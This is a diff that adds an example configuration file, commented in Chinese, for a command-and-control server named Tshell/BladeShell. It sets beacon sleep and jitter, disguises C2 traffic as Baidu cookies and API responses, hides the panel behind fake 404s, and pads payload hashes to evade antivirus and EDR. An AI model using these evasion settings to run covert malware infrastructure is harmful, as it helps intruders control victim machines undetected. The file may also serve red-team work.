@@ -1,0 +1,146 @@
+# ============================================================
+# Tshell C2 服务端配置示例（复制为 config.yaml 后按需修改）
+# 真实 config.yaml 含密钥与通知凭证，已被 .gitignore 排除，禁止提交。
+# 修改后需重启服务端生效。
+# ============================================================
+
+application:
+    name: BladeShell          # 应用名称（显示于前端标题等）
+    version: 2.0.2            # 版本号
+    author: BladeShell Team   # 作者标识
+
+server:
+    host: 0.0.0.0             # HTTP 监听地址（0.0.0.0 = 所有网卡）
+    port: 8089                # HTTP 监听端口（前端/API/WebSocket 入口）
+    mode: release             # Gin 运行模式：debug / release
+    read_timeout: 30s         # 请求读超时（防慢速连接）
+    write_timeout: 30s        # 响应写超时
+    idle_timeout: 1m0s        # 连接空闲超时（HTTP/1.1 keep-alive）
+    external_ip: ""           # 外部 IP（留空自动探测；用于生成公开 URL）
+    auto_detect_ip: true      # 是否自动探测外部 IP（true 时 external_ip 被覆盖）
+
+database:
+    type: sqlite3             # 数据库类型（仅支持 sqlite3）
+    path: ./database.db       # SQLite 数据库文件路径
+    max_open_conns: 10        # 最大打开连接数
+    max_idle_conns: 5         # 最大空闲连接数
+    max_lifetime: 5m0s        # 连接最大存活时间（防陈旧连接）
+
+jwt:
+    secret_key_file: ./jwt_key.hex   # JWT 签名密钥文件（缺失自动生成）
+    access_token_ttl: 15m0s    # 访问令牌有效期（15 分钟；前端过段时间退避，可调长，如 60m）
+    refresh_token_ttl: 168h0m0s # 刷新令牌有效期（默认 7 天；刷新令牌在 HttpOnly Cookie，页面刷新后仍可续期）
+    max_refresh_count: 100     # 刷新令牌最大续期次数（防滥用；超出需重新登录）
+    algorithm: HS256           # JWT 签名算法
+
+logging:
+    level: error               # 日志级别：debug / info / warn / error（error 最隐蔽，CNA 脚本输出直接 stdout 不受此限制）
+    format: json               # 日志格式：json / text
+    output: stdout             # 日志输出：stdout / file
+    audit_log_dir: ./logs      # 审计日志目录
+    max_file_size: 104857600   # 审计日志单文件上限（字节，100MB）
+    max_retain_days: 30        # 审计日志保留天数
+    enable_console: true       # 是否启用控制台输出
+
+client:
+    sleep: 5                   # 客户端默认心跳/睡眠间隔（秒；等同 CS beacon 的 sleep，决定回连与命令节流节奏）
+    jitter: 20                 # 心跳抖动百分比（0-50；在间隔上随机 ±，打破固定节奏）
+
+security:
+    # 会话密钥派生盐上下文(客户端生成时写入;修改后需重新生成客户端;建议保持中性随机串,不带 c2/key/session 特征)
+    session_key_info: "CHANGE_ME_random_hex"
+    enable_rate_limit: true    # 是否启用登录/API 限流
+    login_rate_limit: 5        # 登录失败限流阈值（时间窗内次数）
+    api_rate_limit: 100        # API 请求限流阈值（时间窗内次数）
+    block_duration: 15m0s      # 触发限流后的封禁时长
+    sliding_window: 1m0s       # 限流滑动窗口
+    max_login_attempts: 5      # 登录失败锁定阈值（达到后锁定账户）
+    enable_ip_whitelist: false # 是否启用 IP 白名单（true 时仅白名单 IP 可访问）
+    whitelist_ips: []          # 白名单 IP 列表（如 ["127.0.0.1","192.168.1.0/24"]）
+
+connection_pool:
+    max_connections: 1000      # 连接池最大连接数
+    max_idle_time: 60m         # 空闲连接回收时长
+    health_check_period: 5m    # 连接健康检查周期
+    conn_timeout: 10s          # 建连超时
+    read_timeout: 30s          # 读超时
+    write_timeout: 30s         # 写超时
+
+worker_pool:
+    worker_count: 0            # 工作池协程数（0 = 按 CPU 自适应）
+    max_queue_size: 0          # 工作队列上限（0 = 默认值）
+    enable_metrics: true       # 是否启用工作池指标
+
+auth:
+    default_username: admin    # 默认管理员用户名（首次启动创建）
+    default_password: admin    # 默认管理员密码（弱口令会被替换为随机密码，见日志）
+    force_change_password: false # 是否强制首次登录修改密码
+    # ⚠️ 隐藏访问密钥：部署时必须替换为 ≥8 字符强随机串（弱密钥会被自动禁用）
+    hidden_access_key: "CHANGE_ME_strong_random_key"
+    enable_hidden_access: false # 是否启用隐藏访问保护（未授权请求伪装 404，防指纹识别）
+    hidden_access_config:
+        access_paths:          # 隐藏访问入口路径（携带正确密钥可建立会话）
+            - /pass
+            - /secret
+        param_names:           # 密钥允许的查询参数名
+            - key
+            - pass
+            - token
+        secret_key: "CHANGE_ME_strong_random_key"  # 隐藏访问密钥（与 hidden_access_key 一致）
+        session_ttl: 3600      # 隐藏访问会话时长（秒；期间免密钥访问）
+
+http:
+    # HTTP 流量伪装（客户端与服务端一致；修改需同时重新生成客户端）
+    # get_metadata_prepend: 元数据 Cookie 前置串（含占位符，创建监听器时替换）
+    get_metadata_prepend: BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;SESSIONID=
+    # 以下为各 GET/POST 响应体的伪装前后缀（模拟业务接口响应结构）
+    get_output_prepend: '{"data":{"log_id":"3796460674","action_rule":{"pos_1":["'
+    get_output_append: '%%"],"pos_2":[],"pos_3":[]}}'
+    post_id_prepend: BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;user=
+    post_id_append: '%%; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE'
+    post_client_output_prepend: '{"data":{"log_id":"3796460677","action_rule":{"pos_1":[],"pos_2":["'
+    post_client_output_append: '%%"],"pos_3":[]}}'
+    post_client_output_type: print
+    post_client_output_type_value: _data
+    post_server_output_prepend: '{"data":{"log_id":"3796460679","action_rule":{"pos_1":[],"pos_2":[],"pos_3":["'
+    post_server_output_append: '%%"]}}'
+
+notifications:
+    # 上线/告警通知（钉钉/企微/飞书，enable 为 true 生效）
+    # ⚠️ 凭证属敏感信息：生产环境建议从本地 config.yaml 注入，勿提交到仓库
+    dingtalk:
+        enable: false
+        token: ""
+        keyword: 上线
+        secret: ""
+    wecom:
+        enable: false
+        wx_key: ""
+    feishu:
+        enable: false
+        webhook: ""
+        secret: ""
+        keyword: 上线
+    enable: false               # 总开关
+    enable_audio: false         # 是否启用音频提醒
+
+obfuscation:
+    # 载荷混淆（OPSEC：二进制特征规避）
+    # hash_pad: 二进制 Hash 轮换——生成每份载荷时在尾部追加随机填充字节，
+    # 使每份载荷 hash 唯一化，规避"同一模板二进制 hash 固定"的 AV/EDR 静态标记。
+    # 仅对 exe/raw/dll 生效；shellcode(bin/hex/c) 长度敏感不追加。默认开启。
+    hash_pad: true
+
+delivery:
+    default_scheme: http        # WebDelivery 默认协议
+    default_host: ""            # 默认公开主机（留空自动）
+    base_path: ""               # 投递路径前缀（如 /d）
+    force_https: false          # 是否强制 HTTPS 生成 URL
+    omit_default_port: true     # URL 是否省略默认端口
+    cache_max_age: 0            # 投递响应缓存时长（秒）
+    cors_allow_origin: ""       # 投递 CORS 允许源（留空不限制）
+    trust_proxy_headers: true   # 是否信任 X-Forwarded-For 等代理头
+
+https:
+    cert_file: certs/server.pem  # HTTPS 监听器证书文件（留空自动生成自签）
+    key_file: certs/server.key   # HTTPS 监听器私钥文件
